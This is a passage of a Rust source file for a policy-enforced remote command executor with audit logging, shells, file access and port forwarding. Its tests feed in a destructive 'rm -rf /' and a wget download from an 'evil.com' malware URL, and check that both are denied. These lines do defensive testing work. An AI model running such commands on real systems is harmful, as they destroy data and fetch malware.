//! Command execution with policy enforcement, timeout, and output limiting.

use std::collections::HashMap;
use std::sync::Arc;
use std::time::Instant;

use chrono::Utc;
use tokio::process::Command;
use tokio::sync::RwLock;
use tokio::time::{Duration, timeout};

#[cfg(feature = "sysinfo")]
use tokio::sync::Mutex;

use rf_audit::logger::AuditLogger;
use rf_audit::types::AuditEntry;
use rf_crypto::secrets::SecretStore;
use rf_policy::rpc_policy::RpcPolicy;
use rf_rpc::types::{Action, Request, Response, RpcResult};

/// A completed background job.
struct CompletedJob {
    exit_code: i32,
    stdout: String,
    stderr: String,
}

/// State of a background job.
enum JobState {
    Running {
        #[allow(dead_code)] // Used for future signal forwarding
        pid: u32,
    },
    Completed(CompletedJob),
}

/// State of an active port forward.
struct ActiveForward {
    _handle: tokio::task::JoinHandle<()>,
    cancel: tokio::sync::watch::Sender<bool>,
    #[allow(dead_code)] // Kept for diagnostics/listing
    bind_addr: String,
}

/// Executor handles RPC requests under policy control.
pub struct Executor {
    policy: Arc<RwLock<RpcPolicy>>,
    audit: Arc<dyn AuditLogger>,
    caller_key: String,
    agent_id: String,
    start_time: Instant,
    /// Background jobs tracked by job ID.
    jobs: Arc<tokio::sync::Mutex<HashMap<String, JobState>>>,
    /// Active shell sessions (PTY).
    #[cfg(unix)]
    shells: Arc<tokio::sync::Mutex<HashMap<String, crate::pty::PtySession>>>,
    /// Active port forwards.
    forwards: Arc<tokio::sync::Mutex<HashMap<String, ActiveForward>>>,
    /// Sealed secret store for `{{ secrets.KEY }}` resolution in commands.
    secrets: Option<Arc<tokio::sync::Mutex<SecretStore>>>,
    /// Cached sysinfo System to avoid re-scanning on every metrics request.
    #[cfg(feature = "sysinfo")]
    sysinfo_cache: Arc<Mutex<sysinfo::System>>,
}

impl Executor {
    pub fn new(
        policy: Arc<RwLock<RpcPolicy>>,
        audit: Arc<dyn AuditLogger>,
        caller_key: String,
    ) -> Self {
        Self {
            policy,
            audit,
            caller_key,
            agent_id: String::new(),
            start_time: Instant::now(),
            jobs: Arc::new(tokio::sync::Mutex::new(HashMap::new())),
            #[cfg(unix)]
            shells: Arc::new(tokio::sync::Mutex::new(HashMap::new())),
            forwards: Arc::new(tokio::sync::Mutex::new(HashMap::new())),
            secrets: None,
            #[cfg(feature = "sysinfo")]
            sysinfo_cache: Arc::new(Mutex::new(sysinfo::System::new_all())),
        }
    }

    /// Set the agent ID for status reporting.
    pub fn with_agent_id(mut self, id: String) -> Self {
        self.agent_id = id;
        self
    }

    /// Set the start time for uptime calculation.
    pub fn with_start_time(mut self, start: Instant) -> Self {
        self.start_time = start;
        self
    }

    /// Set the sealed secret store for `{{ secrets.KEY }}` resolution.
    pub fn with_secrets(mut self, secrets: Arc<tokio::sync::Mutex<SecretStore>>) -> Self {
        self.secrets = Some(secrets);
        self
    }

    /// Resolve `{{ secrets.KEY }}` patterns in a command string using the secret store.
    async fn resolve_secrets(&self, command: &str) -> Result<String, String> {
        if !command.contains("{{ secrets.") {
            return Ok(command.to_string());
        }
        match &self.secrets {
            Some(store) => {
                let store = store.lock().await;
                store
                    .resolve_template(command)
                    .map_err(|e| format!("secret resolution failed: {e}"))
            }
            None => Err("secrets not configured".to_string()),
        }
    }

    /// Handle an incoming RPC request.
    pub async fn handle(&self, request: Request) -> Response {
        let start = Instant::now();

        let result = match &request.action {
            Action::Execute {
                command,
                env,
                workdir,
            } => {
                self.handle_execute(&request.id, command, env, workdir, start)
                    .await
            }
            #[cfg(feature = "sysinfo")]
            Action::Metrics => self.handle_metrics().await,
            #[cfg(not(feature = "sysinfo"))]
            Action::Metrics => RpcResult::Error {
                message: "metrics not available (compiled without sysinfo feature)".into(),
            },
            Action::Status => self.handle_status(),
            Action::Read { path } => self.handle_read(path).await,
            Action::Write { path, data, mode } => self.handle_write(path, data, *mode).await,
            Action::List { path } => self.handle_list(path).await,
            Action::Signal { pid, signal } => self.handle_signal(*pid, *signal),
            Action::BackgroundExec {
                command,
                env,
                workdir,
            } => self.handle_background_exec(command, env, workdir).await,
            Action::JobQuery { job_id } => self.handle_job_query(job_id).await,
            Action::JobWait { job_id } => self.handle_job_wait(job_id).await,
            Action::Ping => RpcResult::Pong {
                timestamp_ms: std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap_or_default()
                    .as_millis() as u64,
            },
            #[cfg(unix)]
            Action::Shell {
                shell,
                rows,
                cols,
                env,
            } => {
                self.handle_shell_open(shell.clone(), *rows, *cols, env.clone())
                    .await
            }
            #[cfg(not(unix))]
            Action::Shell { .. } => RpcResult::Error {
                message: "shell sessions not supported on this platform".into(),
            },
            #[cfg(unix)]
            Action::ShellInput { session_id, data } => {
                self.handle_shell_input(session_id, data).await
            }
            #[cfg(not(unix))]
            Action::ShellInput { .. } => RpcResult::Error {
                message: "shell sessions not supported on this platform".into(),
            },
            #[cfg(unix)]
            Action::ShellResize {
                session_id,
                rows,
                cols,
            } => self.handle_shell_resize(session_id, *rows, *cols).await,
            #[cfg(not(unix))]
            Action::ShellResize { .. } => RpcResult::Error {
                message: "shell sessions not supported on this platform".into(),
            },
            #[cfg(unix)]
            Action::ShellClose { session_id } => self.handle_shell_close(session_id).await,
            #[cfg(not(unix))]
            Action::ShellClose { .. } => RpcResult::Error {
                message: "shell sessions not supported on this platform".into(),
            },
            Action::PortForward {
                bind_addr,
                target_addr,
            } => self.handle_port_forward(bind_addr, target_addr).await,
            Action::PortForwardClose { forward_id } => {
                self.handle_port_forward_close(forward_id).await
            }
            Action::RemoteForward {
                bind_addr,
                target_addr,
            } => self.handle_remote_forward(bind_addr, target_addr).await,
            Action::Socks5Forward { bind_addr } => self.handle_socks5_forward(bind_addr).await,
            Action::Socks5Close { forward_id } => self.handle_port_forward_close(forward_id).await,
            Action::HealthCheck {
                probe_type,
                target,
                timeout_ms,
            } => {
                self.handle_health_check(probe_type, target, *timeout_ms)
                    .await
            }
            Action::TailLog { path, lines } => self.handle_tail_log(path, *lines).await,
            Action::StreamExecute {
                command,
                env,
                workdir,
            } => {
                // StreamExecute runs synchronously (like Execute) when no streaming
                // channel is available. The full streaming path uses stream_execute()
                // directly from the agent's RPC loop with a mpsc sender.
                self.handle_execute(&request.id, command, env, workdir, start)
                    .await
            }
        };

        Response {
            id: request.id,
            result,
        }
    }

    async fn handle_execute(
        &self,
        request_id: &str,
        command: &str,
        env: &std::collections::HashMap<String, String>,
        workdir: &Option<String>,
        start: Instant,
    ) -> RpcResult {
        let policy = self.policy.read().await;

        // Policy check
        let decision = policy.check_command(command);
        let duration_ms = start.elapsed().as_millis() as u64;

        if !decision.allowed {
            if let Err(e) = self.audit.log(AuditEntry {
                timestamp: Utc::now(),
                request_id: request_id.to_string(),
                action: "execute".into(),
                command: Some(command.to_string()),
                decision: "denied".into(),
                matched_rule: decision.matched_rule.clone(),
                exit_code: None,
                duration_ms,
                caller_key: self.caller_key.clone(),
            }) {
                tracing::error!("audit log write failed: {}", e);
            }

            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }

        // Execute with timeout
        let timeout_dur = Duration::from_secs(policy.timeout_seconds as u64);
        let max_output = policy.max_output_bytes as usize;
        drop(policy); // Release read lock before spawning

        // Resolve {{ secrets.KEY }} patterns in the command
        let resolved_command = match self.resolve_secrets(command).await {
            Ok(cmd) => cmd,
            Err(e) => {
                return RpcResult::Error { message: e };
            }
        };

        let mut cmd = Command::new("sh");
        cmd.arg("-c").arg(&resolved_command);

        if let Some(dir) = workdir {
            cmd.current_dir(dir);
        }

        for (k, v) in env {
            cmd.env(k, v);
        }

        let output = match timeout(timeout_dur, cmd.output()).await {
            Ok(Ok(output)) => output,
            Ok(Err(e)) => {
                return RpcResult::Error {
                    message: format!("spawn failed: {e}"),
                };
            }
            Err(_) => {
                return RpcResult::Error {
                    message: format!("timeout after {}s", timeout_dur.as_secs()),
                };
            }
        };

        let stdout = String::from_utf8_lossy(&output.stdout[..output.stdout.len().min(max_output)])
            .to_string();
        let stderr = String::from_utf8_lossy(&output.stderr[..output.stderr.len().min(max_output)])
            .to_string();
        let exit_code = output.status.code().unwrap_or(-1);
        let duration_ms = start.elapsed().as_millis() as u64;

        if let Err(e) = self.audit.log(AuditEntry {
            timestamp: Utc::now(),
            request_id: request_id.to_string(),
            action: "execute".into(),
            command: Some(command.to_string()),
            decision: "allowed".into(),
            matched_rule: decision.matched_rule,
            exit_code: Some(exit_code),
            duration_ms,
            caller_key: self.caller_key.clone(),
        }) {
            tracing::error!("audit log write failed: {}", e);
        }

        RpcResult::Success {
            stdout,
            stderr,
            exit_code,
            duration_ms,
        }
    }

    #[cfg(feature = "sysinfo")]
    async fn handle_metrics(&self) -> RpcResult {
        let mut sys = self.sysinfo_cache.lock().await;
        sys.refresh_all();
        let stdout = format!(
            "{{\"hostname\":\"{}\",\"cpus\":{},\"memory_total_mb\":{},\"memory_used_mb\":{}}}",
            sysinfo::System::host_name().unwrap_or_default(),
            sys.cpus().len(),
            sys.total_memory() / 1024 / 1024,
            sys.used_memory() / 1024 / 1024,
        );

        RpcResult::Success {
            stdout,
            stderr: String::new(),
            exit_code: 0,
            duration_ms: 0,
        }
    }

    fn handle_status(&self) -> RpcResult {
        RpcResult::StatusInfo {
            agent_id: self.agent_id.clone(),
            version: env!("CARGO_PKG_VERSION").to_string(),
            uptime_seconds: self.start_time.elapsed().as_secs(),
        }
    }

    async fn handle_read(&self, path: &str) -> RpcResult {
        let file_path = std::path::Path::new(path);

        // Policy check (check_path resolves symlinks internally)
        let policy = self.policy.read().await;
        let decision = policy.check_path(file_path);
        if !decision.allowed {
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        let max_output = policy.max_output_bytes as usize;
        drop(policy);

        // Resolve for actual read
        let resolved = match tokio::fs::canonicalize(path).await {
            Ok(p) => p,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("resolve path: {e}"),
                };
            }
        };

        match tokio::fs::read(&resolved).await {
            Ok(data) => {
                let truncated = if data.len() > max_output {
                    data[..max_output].to_vec()
                } else {
                    data
                };
                // Return file content as base64 in stdout
                use base64::Engine;
                let encoded = base64::engine::general_purpose::STANDARD.encode(&truncated);
                RpcResult::Success {
                    stdout: encoded,
                    stderr: String::new(),
                    exit_code: 0,
                    duration_ms: 0,
                }
            }
            Err(e) => RpcResult::Error {
                message: format!("read file: {e}"),
            },
        }
    }

    async fn handle_write(&self, path: &str, data: &[u8], mode: Option<u32>) -> RpcResult {
        let file_path = std::path::Path::new(path);

        // Policy check
        let policy = self.policy.read().await;
        let decision = policy.check_path(file_path);
        if !decision.allowed {
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        drop(policy);

        // Atomic write: write to temp file then rename
        let temp_path = format!("{path}.rf_tmp");
        if let Err(e) = tokio::fs::write(&temp_path, data).await {
            return RpcResult::Error {
                message: format!("write temp file: {e}"),
            };
        }

        // Set permissions if specified (Unix only)
        #[cfg(unix)]
        if let Some(m) = mode {
            use std::os::unix::fs::PermissionsExt;
            let perms = std::fs::Permissions::from_mode(m);
            if let Err(e) = tokio::fs::set_permissions(&temp_path, perms).await {
                let _ = tokio::fs::remove_file(&temp_path).await;
                return RpcResult::Error {
                    message: format!("set permissions: {e}"),
                };
            }
        }
        // On non-Unix, mode is ignored
        #[cfg(not(unix))]
        let _ = mode;

        // Atomic rename
        if let Err(e) = tokio::fs::rename(&temp_path, path).await {
            let _ = tokio::fs::remove_file(&temp_path).await;
            return RpcResult::Error {
                message: format!("rename: {e}"),
            };
        }

        RpcResult::Success {
            stdout: format!("wrote {} bytes to {}", data.len(), path),
            stderr: String::new(),
            exit_code: 0,
            duration_ms: 0,
        }
    }

    async fn handle_list(&self, path: &str) -> RpcResult {
        let file_path = std::path::Path::new(path);

        // Policy check
        let policy = self.policy.read().await;
        let decision = policy.check_path(file_path);
        if !decision.allowed {
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        drop(policy);

        // Resolve symlinks
        let resolved = match tokio::fs::canonicalize(path).await {
            Ok(p) => p,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("resolve path: {e}"),
                };
            }
        };

        let mut entries = Vec::new();
        let mut dir = match tokio::fs::read_dir(&resolved).await {
            Ok(d) => d,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("read dir: {e}"),
                };
            }
        };

        while let Ok(Some(entry)) = dir.next_entry().await {
            let name = entry.file_name().to_string_lossy().to_string();
            let is_dir = entry.file_type().await.map(|t| t.is_dir()).unwrap_or(false);
            entries.push(if is_dir { format!("{name}/") } else { name });
        }

        entries.sort();
        RpcResult::Success {
            stdout: entries.join("\n"),
            stderr: String::new(),
            exit_code: 0,
            duration_ms: 0,
        }
    }

    fn handle_signal(&self, pid: u32, signal: i32) -> RpcResult {
        #[cfg(unix)]
        {
            // Send signal to process
            let result = unsafe { libc::kill(pid as libc::pid_t, signal as libc::c_int) };
            if result == 0 {
                RpcResult::Success {
                    stdout: format!("signal {signal} sent to pid {pid}"),
                    stderr: String::new(),
                    exit_code: 0,
                    duration_ms: 0,
                }
            } else {
                RpcResult::Error {
                    message: format!(
                        "kill({}, {}): {}",
                        pid,
                        signal,
                        std::io::Error::last_os_error()
                    ),
                }
            }
        }
        #[cfg(not(unix))]
        {
            let _ = (pid, signal);
            RpcResult::Error {
                message: "signal not supported on this platform".into(),
            }
        }
    }

    async fn handle_background_exec(
        &self,
        command: &str,
        env: &std::collections::HashMap<String, String>,
        workdir: &Option<String>,
    ) -> RpcResult {
        // Policy check
        let policy = self.policy.read().await;
        let decision = policy.check_command(command);
        if !decision.allowed {
            return RpcResult::Denied {
                reason: decision.reason,
                rule: decision.matched_rule,
            };
        }
        let max_output = policy.max_output_bytes as usize;
        drop(policy);

        let mut cmd = Command::new("sh");
        cmd.arg("-c").arg(command);
        if let Some(dir) = workdir {
            cmd.current_dir(dir);
        }
        for (k, v) in env {
            cmd.env(k, v);
        }

        let child = match cmd
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn()
        {
            Ok(child) => child,
            Err(e) => {
                return RpcResult::Error {
                    message: format!("spawn failed: {e}"),
                };
            }
        };

        let pid = child.id().unwrap_or(0);
        let job_id = uuid::Uuid::new_v4().to_string();

        // Store job as running
        {
            let mut jobs = self.jobs.lock().await;
            jobs.insert(job_id.clone(), JobState::Running { pid });
        }

        // Spawn background task to wait for completion
        let jobs = self.jobs.clone();
        let job_id_clone = job_id.clone();
        tokio::spawn(async move {
            match child.wait_with_output().await {
                Ok(output) => {
                    let stdout = String::from_utf8_lossy(
                        &output.stdout[..output.stdout.len().min(max_output)],
                    )
                    .to_string();
                    let stderr = String::from_utf8_lossy(
                        &output.stderr[..output.stderr.len().min(max_output)],
                    )
                    .to_string();
                    let exit_code = output.status.code().unwrap_or(-1);
                    let mut jobs = jobs.lock().await;
                    jobs.insert(
                        job_id_clone,
                        JobState::Completed(CompletedJob {
                            exit_code,
                            stdout,
                            stderr,
                        }),
                    );
                }
                Err(_) => {
                    let mut jobs = jobs.lock().await;
                    jobs.insert(
                        job_id_clone,
                        JobState::Completed(CompletedJob {
                            exit_code: -1,
                            stdout: String::new(),
                            stderr: "process wait failed".into(),
                        }),
                    );
                }
            }
        });

        RpcResult::JobStarted { job_id, pid }
    }

    async fn handle_job_query(&self, job_id: &str) -> RpcResult {
        let jobs = self.jobs.lock().await;
        match jobs.get(job_id) {
            Some(JobState::Running { .. }) => RpcResult::JobStatus {
                job_id: job_id.into(),
                running: true,
                exit_code: None,
                stdout: None,
                stderr: None,
            },
            Some(JobState::Completed(job)) => RpcResult::JobStatus {
                job_id: job_id.into(),
                running: false,
                exit_code: Some(job.exit_code),
                stdout: Some(job.stdout.clone()),
                stderr: Some(job.stderr.clone()),
            },
            None => RpcResult::Error {
                message: format!("unknown job: {job_id}"),
            },
        }
    }

    async fn handle_job_wait(&self, job_id: &str) -> RpcResult {
        // Poll until complete (with timeout)
        let deadline = tokio::time::Instant::now() + Duration::from_secs(300);
        loop {
            {
                let jobs = self.jobs.lock().await;
                if let Some(JobState::Completed(job)) = jobs.get(job_id) {
                    return RpcResult::JobStatus {
                        job_id: job_id.into(),
                        running: false,
                        exit_code: Some(job.exit_code),
                        stdout: Some(job.stdout.clone()),
                        stderr: Some(job.stderr.clone()),
                    };
                }
                if !jobs.contains_key(job_id) {
                    return RpcResult::Error {
                        message: format!("unknown job: {job_id}"),
                    };
                }
            }
            if tokio::time::Instant::now() > deadline {
                return RpcResult::Error {
                    message: format!("timeout waiting for job: {job_id}"),
                };
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
    }

    // --- Shell session handlers ---

    #[cfg(unix)]
    async fn handle_shell_open(
        &self,
        shell: Option<String>,
        rows: u16,
        cols: u16,
        env: HashMap<String, String>,
    ) -> RpcResult {
        use crate::pty::{PtyConfig, PtySession, TerminalSize};

        let config = PtyConfig {
            shell,
            size: TerminalSize { rows, cols },
            cwd: None,
            env: env.into_iter().collect(),
            timeout_secs: 3600,
            record: false,
        };

        match PtySession::spawn(config) {
            Ok(session) => {
                let session_id = uuid::Uuid::new_v4().to_string();
                let mut shells = self.shells.lock().await;
                shells.insert(session_id.clone(), session);
                RpcResult::ShellOpened { session_id }
            }
            Err(e) => RpcResult::Error {
                message: format!("PTY spawn failed: {e}"),
            },
        }
    }

    #[cfg(unix)]
    async fn handle_shell_input(&self, session_id: &str, data: &[u8]) -> RpcResult {
        let mut shells = self.shells.lock().await;
        match shells.get_mut(session_id) {
            Some(session) => match session.write(data) {
                Ok(_) => {
                    // Read back any available output
                    let mut buf = vec![0u8; 8192];
                    // Small delay to let the shell process the input
                    drop(shells);
                    tokio::time::sleep(Duration::from_millis(10)).await;
                    let mut shells = self.shells.lock().await;
                    if let Some(session) = shells.get_mut(session_id) {
                        match session.read(&mut buf) {
                            Ok(0) => RpcResult::ShellOutput {
                                session_id: session_id.to_string(),
                                data: Vec::new(),
                            },
                            Ok(n) => RpcResult::ShellOutput {
                                session_id: session_id.to_string(),
                                data: buf[..n].to_vec(),
                            },
                            Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                                RpcResult::ShellOutput {
                                    session_id: session_id.to_string(),
                                    data: Vec::new(),
                                }
                            }
                            Err(e) => RpcResult::Error {
                                message: format!("PTY read error: {e}"),
                            },
                        }
                    } else {
                        RpcResult::Error {
                            message: "session disappeared".into(),
                        }
                    }
                }
                Err(e) => RpcResult::Error {
                    message: format!("PTY write error: {e}"),
                },
            },
            None => RpcResult::Error {
                message: format!("shell session not found: {session_id}"),
            },
        }
    }

    #[cfg(unix)]
    async fn handle_shell_resize(&self, session_id: &str, rows: u16, cols: u16) -> RpcResult {
        use crate::pty::TerminalSize;
        let shells = self.shells.lock().await;
        match shells.get(session_id) {
            Some(session) => {
                session.resize(TerminalSize { rows, cols });
                RpcResult::Success {
                    stdout: String::new(),
                    stderr: String::new(),
                    exit_code: 0,
                    duration_ms: 0,
                }
            }
            None => RpcResult::Error {
                message: format!("shell session not found: {session_id}"),
            },
        }
    }

    #[cfg(unix)]
    async fn handle_shell_close(&self, session_id: &str) -> RpcResult {
        use crate::pty::PtySignal;
        let mut shells = self.shells.lock().await;
        match shells.remove(session_id) {
            Some(session) => {
                let _ = session.signal(PtySignal::Sighup);
                RpcResult::ShellExited {
                    session_id: session_id.to_string(),
                    exit_code: 0,
                }
            }
            None => RpcResult::Error {
                message: format!("shell session not found: {session_id}"),
            },
        }
    }

    // --- Port forward handlers ---

    async fn handle_port_forward(&self, bind_addr: &str, target_addr: &str) -> RpcResult {
        use rf_rpc::forward::start_local_forward;

        let (cancel_tx, cancel_rx) = tokio::sync::watch::channel(false);
        match start_local_forward(bind_addr, target_addr.to_string(), cancel_rx).await {
            Ok(handle) => {
                let forward_id = uuid::Uuid::new_v4().to_string();
                let bound = bind_addr.to_string();
                let mut forwards = self.forwards.lock().await;
                forwards.insert(
                    forward_id.clone(),
                    ActiveForward {
                        _handle: handle,
                        cancel: cancel_tx,
                        bind_addr: bound.clone(),
                    },
                );
                RpcResult::ForwardStarted {
                    forward_id,
                    bind_addr: bound,
                }
            }
            Err(e) => RpcResult::Error {
                message: format!("port forward bind failed: {e}"),
            },
        }
    }

    async fn handle_port_forward_close(&self, forward_id: &str) -> RpcResult {
        let mut forwards = self.forwards.lock().await;
        match forwards.remove(forward_id) {
            Some(fwd) => {
                let _ = fwd.cancel.send(true);
                RpcResult::ForwardStopped {
                    forward_id: forward_id.to_string(),
                }
            }
            None => RpcResult::Error {
                message: format!("forward not found: {forward_id}"),
            },
        }
    }

    async fn handle_remote_forward(&self, bind_addr: &str, target_addr: &str) -> RpcResult {
        use rf_rpc::forward::start_remote_forward;

        let (cancel_tx, cancel_rx) = tokio::sync::watch::channel(false);
        match start_remote_forward(bind_addr, target_addr.to_string(), cancel_rx).await {
            Ok((handle, bound)) => {
                let forward_id = uuid::Uuid::new_v4().to_string();
                let bound_str = bound.to_string();
                let mut forwards = self.forwards.lock().await;
                forwards.insert(
                    forward_id.clone(),
                    ActiveForward {
                        _handle: handle,
                        cancel: cancel_tx,
                        bind_addr: bound_str.clone(),
                    },
                );
                RpcResult::ForwardStarted {
                    forward_id,
                    bind_addr: bound_str,
                }
            }
            Err(e) => RpcResult::Error {
                message: format!("remote forward bind failed: {e}"),
            },
        }
    }

    async fn handle_socks5_forward(&self, bind_addr: &str) -> RpcResult {
        use rf_rpc::socks5::{Socks5Config, Socks5Server};

        let (cancel_tx, cancel_rx) = tokio::sync::watch::channel(false);
        let config = Socks5Config {
            bind_addr: bind_addr.to_string(),
            ..Default::default()
        };
        let mut server = Socks5Server::new(config, cancel_rx);
        match server.run().await {
            Ok(bound) => {
                let forward_id = uuid::Uuid::new_v4().to_string();
                let bound_str = bound.to_string();
                let mut forwards = self.forwards.lock().await;
                // Use a no-op JoinHandle placeholder since Socks5Server spawns internally
                let handle = tokio::spawn(async {});
                forwards.insert(
                    forward_id.clone(),
                    ActiveForward {
                        _handle: handle,
                        cancel: cancel_tx,
                        bind_addr: bound_str.clone(),
                    },
                );
                RpcResult::ForwardStarted {
                    forward_id,
                    bind_addr: bound_str,
                }
            }
            Err(e) => RpcResult::Error {
                message: format!("SOCKS5 forward failed: {e}"),
            },
        }
    }

    // --- Health check handler ---

    async fn handle_health_check(
        &self,
        probe_type: &str,
        target: &str,
        timeout_ms: u64,
    ) -> RpcResult {
        use crate::health::{ProbeType, execute_probe};

        let probe = match probe_type {
            "tcp" => {
                // Parse target as host:port
                let parts: Vec<&str> = target.rsplitn(2, ':').collect();
                if parts.len() != 2 {
                    return RpcResult::Error {
                        message: "invalid target format, expected host:port".into(),
                    };
                }
                let port: u16 = match parts[0].parse() {
                    Ok(p) => p,
                    Err(_) => {
                        return RpcResult::Error {
                            message: "invalid port".into(),
                        };
                    }
                };
                ProbeType::Tcp {
                    host: parts[1].to_string(),
                    port,
                }
            }
            "http" => ProbeType::Http {
                url: target.to_string(),
                expected_status: 200,
            },
            "command" => ProbeType::Command {
                cmd: target.to_string(),
            },
            "process" => ProbeType::Process {
                name: target.to_string(),
            },
            _ => {
                return RpcResult::Error {
                    message: format!("unknown probe type: {probe_type}"),
                };
            }
        };

        let timeout_dur = Duration::from_millis(timeout_ms);
        let result = execute_probe(&probe, timeout_dur).await;

        RpcResult::HealthCheckResult {
            success: result.success,
            latency_ms: result.latency_ms,
            error: result.error,
        }
    }

    // --- Log tail handler ---

    async fn handle_tail_log(&self, path: &str, lines: Option<u32>) -> RpcResult {
        // Read the last N lines from a file
        let max_lines = lines.unwrap_or(50) as usize;

        match tokio::fs::read_to_string(path).await {
            Ok(content) => {
                let all_lines: Vec<&str> = content.lines().collect();
                let start = all_lines.len().saturating_sub(max_lines);
                let tail: Vec<String> = all_lines[start..].iter().map(|s| s.to_string()).collect();
                RpcResult::TailOutput {
                    lines: tail,
                    path: path.to_string(),
                }
            }
            Err(e) => RpcResult::Error {
                message: format!("failed to read {path}: {e}"),
            },
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use rf_audit::logger::AuditLogger;
    use rf_audit::types::AuditEntry;
    use std::sync::Mutex;

    /// In-memory audit logger for testing.
    struct TestAuditLogger {
        entries: Mutex<Vec<AuditEntry>>,
    }

    impl TestAuditLogger {
        fn new() -> Self {
            Self {
                entries: Mutex::new(Vec::new()),
            }
        }

        fn entries(&self) -> Vec<AuditEntry> {
            self.entries.lock().unwrap().clone()
        }
    }

    impl AuditLogger for TestAuditLogger {
        fn log(&self, entry: AuditEntry) -> Result<(), rf_audit::logger::AuditError> {
            self.entries.lock().unwrap().push(entry);
            Ok(())
        }
    }

    fn test_policy() -> RpcPolicy {
        let yaml = r#"
spec:
  commands:
    allow:
      - pattern: "^echo .*"
      - pattern: "^cat /tmp/.*"
      - pattern: "^true$"
      - pattern: "^false$"
      - pattern: "^sleep .*"
    deny:
      - pattern: ".*rm.*-rf.*"
      - pattern: ".*secret.*"
  resources:
    maxOutputBytes: 1024
    timeoutSeconds: 2
"#;
        RpcPolicy::from_yaml(yaml).unwrap()
    }

    fn make_executor(audit: Arc<dyn AuditLogger>) -> Executor {
        let policy = Arc::new(RwLock::new(test_policy()));
        Executor::new(policy, audit, "test-caller-key".into())
    }

    #[tokio::test]
    async fn test_execute_allowed_command() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-1".into(),
            action: Action::Execute {
                command: "echo hello world".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        assert_eq!(resp.id, "req-1");

        if let RpcResult::Success {
            stdout, exit_code, ..
        } = &resp.result
        {
            assert_eq!(stdout.trim(), "hello world");
            assert_eq!(*exit_code, 0);
        } else {
            panic!("expected success, got {:?}", resp.result);
        }

        // Verify audit entry
        let entries = audit.entries();
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].decision, "allowed");
    }

    #[tokio::test]
    async fn test_execute_denied_command() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-2".into(),
            action: Action::Execute {
                command: "rm -rf /".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        assert_eq!(resp.id, "req-2");

        if let RpcResult::Denied { reason, rule } = &resp.result {
            assert!(reason.contains("deny rule"));
            assert!(rule.contains("rm.*-rf"));
        } else {
            panic!("expected denied, got {:?}", resp.result);
        }

        // Verify audit entry records denial
        let entries = audit.entries();
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].decision, "denied");
    }

    #[tokio::test]
    async fn test_execute_default_deny() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-3".into(),
            action: Action::Execute {
                command: "wget http://evil.com/malware".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Denied { reason, .. } = &resp.result {
            assert!(reason.contains("deny-by-default"));
        } else {
            panic!("expected denied, got {:?}", resp.result);
        }
    }

    #[tokio::test]
    async fn test_execute_nonzero_exit_code() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-4".into(),
            action: Action::Execute {
                command: "false".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Success { exit_code, .. } = &resp.result {
            assert_ne!(*exit_code, 0);
        } else {
            panic!("expected success with non-zero exit, got {:?}", resp.result);
        }
    }

    #[tokio::test]
    async fn test_execute_timeout() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-5".into(),
            action: Action::Execute {
                command: "sleep 10".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Error { message } = &resp.result {
            assert!(message.contains("timeout"));
        } else {
            panic!("expected timeout error, got {:?}", resp.result);
        }
    }

    #[tokio::test]
    async fn test_execute_output_limiting() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        // Generate output larger than maxOutputBytes (1024)
        let req = Request {
            id: "req-6".into(),
            action: Action::Execute {
                command: "echo $(head -c 2048 /dev/zero | tr '\\0' 'A')".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Success { stdout, .. } = &resp.result {
            assert!(stdout.len() <= 1024);
        } else {
            panic!("expected success, got {:?}", resp.result);
        }
    }

    #[tokio::test]
    async fn test_execute_with_env() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let mut env = std::collections::HashMap::new();
        env.insert("MY_VAR".into(), "test_value".into());

        let req = Request {
            id: "req-7".into(),
            action: Action::Execute {
                command: "echo $MY_VAR".into(),
                env,
                workdir: None,
            },
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Success { stdout, .. } = &resp.result {
            assert_eq!(stdout.trim(), "test_value");
        } else {
            panic!("expected success, got {:?}", resp.result);
        }
    }

    #[tokio::test]
    async fn test_metrics_action() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-8".into(),
            action: Action::Metrics,
            timeout_ms: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Success { stdout, .. } = &resp.result {
            assert!(stdout.contains("cpus"));
            assert!(stdout.contains("memory_total_mb"));
        } else {
            panic!("expected success, got {:?}", resp.result);
        }
    }

    #[tokio::test]
